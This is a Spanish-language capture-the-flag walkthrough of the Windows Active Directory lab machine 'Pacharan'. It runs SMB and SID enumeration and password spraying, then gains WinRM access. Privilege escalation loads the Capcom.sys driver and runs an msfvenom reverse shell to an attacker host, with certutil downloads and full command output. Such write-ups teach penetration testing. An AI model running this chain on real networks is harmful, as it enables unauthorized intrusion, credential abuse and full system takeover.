---
icon: windows
---

**Plataforma:** The Hackers Labs\
**Sistema Operativo:** Windows

> **Tags:** `Windows` `SMB` `Information Leakage` `Password Spraying` `WinRM` `SeLoadDriverPrivilege` 

## INSTALACIÓN

Descargamos el archivo `zip` que contiene la `.ova` de la máquina Pacharan, lo extraemos y la importamos en VirtualBox.

Configuramos la interfaz de red de la máquina Pacharan y la iniciamos junto a nuestra máquina atacante.

Identificamos con seguridad que la `IP` de la víctima es `192.168.69.69`.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 192.168.69.69
```

```bash
nmap -n -Pn -sCV -p53,88,135,139,389,445,464,593,5985,47001 --min-rate 5000 192.168.69.69
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 18:00 +0100
Nmap scan report for 192.168.69.69
Host is up (0.00019s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-23 17:00:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 08:00:27:52:8F:4D (Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-23T17:00:38
|_  start_date: 2026-02-23T16:46:41
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -4s
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:52:8f:4d (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds
```

Observamos que el dominio es PACHARAN.THL, lo añadimos al archivo /etc/hosts.

```bash
sudo nano /etc/hosts
```

```
127.0.0.1	localhost
127.0.1.1	kali
192.168.69.69   PACHARAN.THL
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Hemos revelado múltiples puertos abiertos característicos de un entorno Active Directory. 

Procedemos a extraer información del dominio utilizando Enum4linux-ng.

```bash
enum4linux-ng -a PACHARAN.THL
```

```
ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... PACHARAN.THL
[*] Username ......... ''
[*] Random Username .. 'peirymte'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Listener Scan on PACHARAN.THL    |
 =====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for PACHARAN.THL    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: PACHARAN.THL

 ===========================================================
|    NetBIOS Names and Workgroup/Domain for PACHARAN.THL    |
 ===========================================================
[+] Got domain/workgroup name: PACHARAN
[+] Full NetBIOS names information:
- WIN-VRU3GG3DPLJ <00> -         B <ACTIVE>  Workstation Service
- PACHARAN        <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- PACHARAN        <1c> - <GROUP> B <ACTIVE>  Domain Controllers
- WIN-VRU3GG3DPLJ <20> -         B <ACTIVE>  File Server Service
- PACHARAN        <1b> -         B <ACTIVE>  Domain Master Browser
- MAC Address = 08-00-27-52-8F-4D

 =========================================
|    SMB Dialect Check on PACHARAN.THL    |
 =========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ===========================================================
|    Domain Information via SMB session for PACHARAN.THL    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WIN-VRU3GG3DPLJ
NetBIOS domain name: PACHARAN
DNS domain: PACHARAN.THL
FQDN: WIN-VRU3GG3DPLJ.PACHARAN.THL
Derived membership: domain member
Derived domain: PACHARAN

 =========================================
|    RPC Session Check on PACHARAN.THL    |
 =========================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for guest access
[+] Server allows authentication via username 'peirymte' and password ''
[H] Rerunning enumeration with user 'peirymte' might give more results

 ===============================================
|    OS Information via RPC for PACHARAN.THL    |
 ===============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1607'
OS build: '14393'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests, sessions are possible, but not with the provided credentials (see session check results)

Completed after 0.13 seconds
```

## ENUMERACIÓN SMB

Aprovechando el servicio `SMB` en el puerto `445`, utilizamos `NetExec` para enumerar los recursos compartidos accesibles haciendo uso del usuario `guest` sin contraseña.

```Bash
netexec smb PACHARAN.THL -u guest -p ''  --shares
```

Info:
```
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\guest: (Guest)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesión
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2       READ            
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN                        
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  print$                          Controladores de impresora
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users
```

Encontramos un recurso compartido inusual llamado `NETLOGON2` con permisos de lectura. Nos conectamos a él mediante `smbclient`.

```Bash
smbclient //PACHARAN.THL/NETLOGON2 -U guest -p
```

Info:
```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 31 19:25:34 2024
  ..                                  D        0  Wed Jul 31 19:25:34 2024
  Orujo.txt                           A       22  Wed Jul 31 19:25:55 2024

		7735807 blocks of size 4096. 4712190 blocks available
smb: \> get Orujo.txt 
getting file \Orujo.txt of size 22 as Orujo.txt (10.7 KiloBytes/sec) (average 10.7 KiloBytes/sec)
smb: \> exit
```

Descargamos el archivo `Orujo.txt` y leemos su contenido.

```Bash
cat Orujo.txt
```

```
Pericodelospalotes6969
```

Obtenemos lo que claramente parece ser una contraseña en texto plano.

## ENUMERACIÓN DE USUARIOS

Para poder dar utilidad a la contraseña obtenida, necesitamos conocer los usuarios existentes en el dominio. 

Utilizamos `Impacket-lookupsid` para listar los usuarios mediante `fuerza bruta` de `SIDs`.

```Bash
impacket-lookupsid PACHARAN.THL/guest@PACHARAN.THL
```

```
[*] Brute forcing SIDs at PACHARAN.THL
[*] StringBinding ncacn_np:PACHARAN.THL[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3046175042-3013395696-775018414
498: PACHARAN\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
500: PACHARAN\Administrador (SidTypeUser)
501: PACHARAN\Invitado (SidTypeUser)
502: PACHARAN\krbtgt (SidTypeUser)
503: PACHARAN\DefaultAccount (SidTypeUser)
512: PACHARAN\Admins. del dominio (SidTypeGroup)
513: PACHARAN\Usuarios del dominio (SidTypeGroup)
514: PACHARAN\Invitados del dominio (SidTypeGroup)
515: PACHARAN\Equipos del dominio (SidTypeGroup)
516: PACHARAN\Controladores de dominio (SidTypeGroup)
517: PACHARAN\Publicadores de certificados (SidTypeAlias)
518: PACHARAN\Administradores de esquema (SidTypeGroup)
519: PACHARAN\Administradores de empresas (SidTypeGroup)
520: PACHARAN\Propietarios del creador de directivas de grupo (SidTypeGroup)
521: PACHARAN\Controladores de dominio de sólo lectura (SidTypeGroup)
522: PACHARAN\Controladores de dominio clonables (SidTypeGroup)
525: PACHARAN\Protected Users (SidTypeGroup)
526: PACHARAN\Administradores clave (SidTypeGroup)
527: PACHARAN\Administradores clave de la organización (SidTypeGroup)
553: PACHARAN\Servidores RAS e IAS (SidTypeAlias)
571: PACHARAN\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
572: PACHARAN\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
1000: PACHARAN\WIN-VRU3GG3DPLJ$ (SidTypeUser)
1101: PACHARAN\DnsAdmins (SidTypeAlias)
1102: PACHARAN\DnsUpdateProxy (SidTypeGroup)
1103: PACHARAN\Orujo (SidTypeUser)
1104: PACHARAN\Ginebra (SidTypeUser)
1106: PACHARAN\Whisky (SidTypeUser)
1107: PACHARAN\Hendrick (SidTypeUser)
1108: PACHARAN\Chivas Regal (SidTypeUser)
1111: PACHARAN\Whisky2 (SidTypeUser)
1112: PACHARAN\JB (SidTypeUser)
1113: PACHARAN\Chivas (SidTypeUser)
1114: PACHARAN\beefeater (SidTypeUser)
1115: PACHARAN\CarlosV (SidTypeUser)
1116: PACHARAN\RedLabel (SidTypeUser)
1117: PACHARAN\Gordons (SidTypeUser)
```

Guardamos el output en un archivo `users.txt` y procedemos a filtrar únicamente los nombres de usuario, almacenándolos en `users2.txt`.

```Bash
grep "(SidTypeUser)" users.txt | sed 's/.*\\//;s/ (SidTypeUser)//' > users2.txt
```

```Bash
cat users2.txt
```
```
Administrador
Invitado
krbtgt
DefaultAccount
WIN-VRU3GG3DPLJ$
Orujo
Ginebra
Whisky
Hendrick
Chivas Regal
Whisky2
JB
Chivas
beefeater
CarlosV
RedLabel
Gordons
```

## PASSWORD SPRAYING

Con la lista de usuarios y la contraseña descubierta, lanzamos un ataque de `Password Spraying` haciendo uso de `NetExec` para validar si pertenece a alguno de ellos.

```Bash
nxc smb PACHARAN.THL -u users2.txt -p 'Pericodelospalotes6969' 
``` 

Info:
```
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Administrador:Pericodelospalotes6969 STATUS_LOGON_FAILURE
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Invitado:Pericodelospalotes6969 STATUS_LOGON_FAILURE
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\krbtgt:Pericodelospalotes6969 STATUS_LOGON_FAILURE
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\DefaultAccount:Pericodelospalotes6969 STATUS_LOGON_FAILURE
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\WIN-VRU3GG3DPLJ$:Pericodelospalotes6969 STATUS_LOGON_FAILURE
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Orujo:Pericodelospalotes6969
```

El ataque resulta exitoso y validamos que las credenciales pertenecen al usuario `Orujo`.

Comprobamos si este usuario tiene acceso remoto mediante `WinRM` a través del puerto `5985`.

```Bash
nxc winrm PACHARAN.THL -u Orujo -p 'Pericodelospalotes6969'
```

Info:
```
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Pericodelospalotes6969
```

No disponemos de acceso por `WinRM`, pero sí podemos enumerar de nuevo los recursos compartidos de `SMB` ahora que estamos autenticados como `Orujo`.

```Bash
netexec smb PACHARAN.THL -u Orujo -p 'Pericodelospalotes6969'  --shares
```

Info:
```
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Orujo:Pericodelospalotes6969 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Enumerated shares
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  -----           -----------     ------
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON        READ            Recurso compartido del servidor de inicio de sesión 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  NETLOGON2                       
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PACHARAN        READ            
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  PDF Pro Virtual Printer                 Soy Hacker y arreglo impresoras
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  print$                          Controladores de impresora
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesión 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  Users
```

Vemos que tenemos acceso de lectura al recurso compartido `PACHARAN`. Nos conectamos con `smbclient`.

```Bash
smbclient //PACHARAN.THL/PACHARAN -U Orujo -p
```

Info:
```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 31 19:21:13 2024
  ..                                  D        0  Wed Jul 31 19:21:13 2024
  ah.txt                              A      921  Wed Jul 31 19:20:16 2024

		7735807 blocks of size 4096. 4712111 blocks available
smb: \> get ah.txt 
getting file \ah.txt of size 921 as ah.txt (224.8 KiloBytes/sec) (average 224.9 KiloBytes/sec)
smb: \> exit
```

Descargamos el fichero `ah.txt` a nuestra máquina y visualizamos su contenido.

```Bash
cat ah.txt
```

```
Mamasoystreamer1!
Mamasoystreamer2@
Mamasoystreamer3#
Mamasoystreamer4$
Mamasoystreamer5%
Mamasoystreamer6^
Mamasoystreamer7&
Mamasoystreamer8*
Mamasoystreamer9(
Mamasoystreamer10)
MamasoyStreamer11!
MamasoyStreamer12@
MamasoyStreamer13#
MamasoyStreamer14$
MamasoyStreamer15%
MamasoyStreamer16^
MamasoyStreamer17&
MamasoyStreamer18*
MamasoyStreamer19(
MamasoyStreamer20)
MamaSoyStreamer1!
MamaSoyStreamer2@
MamaSoyStreamer3#
MamaSoyStreamer4$
MamaSoyStreamer5%
MamaSoyStreamer6^
MamaSoyStreamer7&
MamaSoyStreamer8*
MamaSoyStreamer9(
MamaSoyStreamer10)
MamasoyStream1er!
MamasoyStream2er@
MamasoyStream3er#
MamasoyStream4er$
MamasoyStream5er%
MamasoyStream6er^
MamasoyStream7er&
MamasoyStream8er*
MamasoyStream9er(
MamasoyStream10er)
MamasoyStr1amer!
MamasoyStr2amer@
MamasoyStr3amer#
MamasoyStr4amer$
MamasoyStr5amer%
MamasoyStr6amer^
MamasoyStr7amer&
MamasoyStr8amer*
MamasoyStr9amer(
MamasoyStr10amer)
Mamasoystreamer1
```

Obtenemos un diccionario completo de posibles contraseñas.

Procedemos a lanzar otro ataque de `Password Spraying` cruzando nuestro listado de usuarios `users2.txt` con este nuevo diccionario de contraseñas `ah.txt`.

```Bash
netexec smb PACHARAN.THL -u users2.txt -p ah.txt --ignore-pw-decoding
```

Info:
```
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Administrador:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Invitado:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\krbtgt:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\DefaultAccount:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\WIN-VRU3GG3DPLJ$:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Ginebra:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Whisky:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Hendrick:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Chivas Regal:Mamasoystreamer1! STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Whisky2:Mamasoystreamer1! STATUS_LOGON_FAILURE 
-----------------------------------------------------<MORE_OUTPUT>--------------------------------------------------------
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\krbtgt:MamasoyStream2er@ STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\DefaultAccount:MamasoyStream2er@ STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\WIN-VRU3GG3DPLJ$:MamasoyStream2er@ STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:MamasoyStream2er@ STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Ginebra:MamasoyStream2er@ STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@
```

Obtenemos credenciales válidas para el usuario `Whisky` : `MamasoyStream2er@`.

Utilizamos estas credenciales para conectarnos por `RPC` con la herramienta `rpcclient` y enumerar la `impresora` mencionada en los recursos compartidos.

```Bash
rpcclient -U Whisky 192.168.69.69
```

Info:
```
rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\192.168.69.69\Soy Hacker y arreglo impresoras]
	description:[\\192.168.69.69\Soy Hacker y arreglo impresoras,Universal Document Converter,TurkisArrusPuchuchuSiu1]
	comment:[Soy Hacker y arreglo impresoras]

rpcclient $>
```

Al revisar la descripción de la impresora, identificamos otra posible contraseña: `TurkisArrusPuchuchuSiu1`.

Realizamos un último `Password Spraying` con esta contraseña contra nuestra lista de usuarios.

```Bash
netexec smb PACHARAN.THL -u users2.txt -p TurkisArrusPuchuchuSiu1
```

Info:
```
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False) 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Administrador:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Invitado:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\WIN-VRU3GG3DPLJ$:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE 
SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1
```

Encontramos que las credenciales son válidas para el usuario `Chivas Regal`. Comprobamos el acceso remoto mediante `WinRM` con este usuario.

```Bash
netexec winrm PACHARAN.THL -u 'Chivas Regal' -p TurkisArrusPuchuchuSiu1
```

Info:
```
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)
```

## ACCESO INICIAL

El acceso mediante `WinRM` nos devuelve un (Pwn3d!), lo que confirma que podemos entablar una sesión remota en la máquina. 

Nos conectamos con `Evil-WinRM`.

```Bash
evil-winrm -i PACHARAN.THL -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'
```

Info:
```
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents> whoami
pacharan\chivas regal
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents>
```

Ya estamos dentro de la máquina.

## ESCALADA DE PRIVILEGIOS

Una vez obtenida la shell, lo primero que hacemos es listar los privilegios asignados a nuestro usuario actual.

```DOS
whoami /priv
```
```
INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                     Estado
============================= =============================================== ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada
```

Observamos que tenemos habilitado el privilegio `SeLoadDriverPrivilege`. Este privilegio permite a un usuario cargar y descargar `controladores de dispositivos` en el sistema. 

Podemos abusar de esta mala configuración para cargar un `controlador vulnerable` firmado como `Capcom.sys`, el cual nos permitirá ejecutar código a nivel de kernel y conseguir privilegios máximos.

Para explotar esta vulnerabilidad, clonamos un repositorio en nuestra máquina atacante que contiene las herramientas necesarias.

```Bash
git clone https://github.com/k4sth4/SeLoadDriverPrivilege
```

Levantamos un servidor `HTTP` con `Python` para transferir los binarios a la máquina víctima.

```Bash
cd SeLoadDriverPrivilege
python3 -m http.server 80
```

En la máquina víctima, creamos un directorio temporal en la raíz para almacenar los ficheros necesarios y descargamos los archivos `Capcom.sys`, `ExploitCapcom.exe` y `eoploaddriver_x64.exe` mediante `certutil.exe`.

```DOS
mkdir temp
cd temp
```

```DOS
certutil.exe -urlcache -split -f http://192.168.69.100/Capcom.sys capcom.sys
certutil.exe -urlcache -split -f http://192.168.69.100/ExploitCapcom.exe exploitcapcom.exe
certutil.exe -urlcache -split -f http://192.168.69.100/eoploaddriver_x64.exe eoploaddriver_x64.exe
```

Info:
```
**** En línea  ****
  0000  ...
  2950
CertUtil: -URLCache comando completado correctamente.
```

Primero, activamos el privilegio `SeLoadDriverPrivilege` haciendo uso de la herramienta que acabamos de subir.

```DOS
./eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\temp\capcom.sys
```

A continuación, utilizamos `ExploitCapcom.exe` para cargar el controlador malicioso `Capcom.sys` en el sistema destino.

```DOS
.\exploitcapcom.exe LOAD C:\temp\capcom.sys
```

Info:
```
[*] Service Name: xtazoicz
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\?????????????????
NTSTATUS: 00000000, WinError: 0
```

Una vez que hemos cargado exitosamente el driver, podemos ejecutar cualquier comando con el máximo nivel de privilegios haciendo uso de la palabra clave `EXPLOIT`. 

Lo comprobamos invocando `whoami`.

```DOS
.\exploitcapcom.exe EXPLOIT whoami
```

Info:
```
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 0000023A34850008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system
```

La ejecución se realiza correctamente. 

Procedemos a generar una `reverse shell` en nuestra máquina atacante utilizando `msfvenom` para obtener una sesión completamente interactiva como `SYSTEM`.

```Bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.69.100 LPORT=4444 -f exe > revshell.exe
```

Subimos la `reverse shell` al directorio `temp` usando la propia herramienta integrada en la sesión de `Evil-WinRM`.

```Bash
upload revshell.exe
```

```
Info: Uploading /home/trihack/revshell.exe to C:\temp\revshell.exe
                                        
Data: 10240 bytes of 10240 bytes copied
                                        
Info: Upload successful!
```

Preparamos el módulo `multi/handler` de `Metasploit` en nuestra máquina para recibir la conexión y ejecutamos el binario a través de nuestro exploit de Capcom.

```bash
msfconsole
msf > use multi/handler
msf exploit(multi/handler) > set LHOST 192.168.69.100
msf exploit(multi/handler) > run
```

```DOS
C:\temp> .\exploitcapcom.exe EXPLOIT revshell.exe
```

Info:
```
[*] Started reverse TCP handler on 192.168.69.100:4444 
[*] Command shell session 1 opened (192.168.69.100:4444 -> 192.168.69.69:49853) at 2026-02-24 15:28:44 +0100


Shell Banner:
Microsoft Windows [Versi_n 10.0.14393]
(c) 2016 Microsoft Corporation. Todos los derechos reservados.
-----
          
C:\temp>whoami
whoami
nt authority\system
```

¡Ya somos administradores del sistema!

Por último, obtenemos las `flags` de usuario y root.

type C:\Users\Chivas Regal\Desktop\user.txt
bb8b4df8eda73e75ca51ca88a909c1cb
type C:\Users\Administrador\Desktop\root.txt
cfa7cb1cc20e26c0428f9222d44c76a0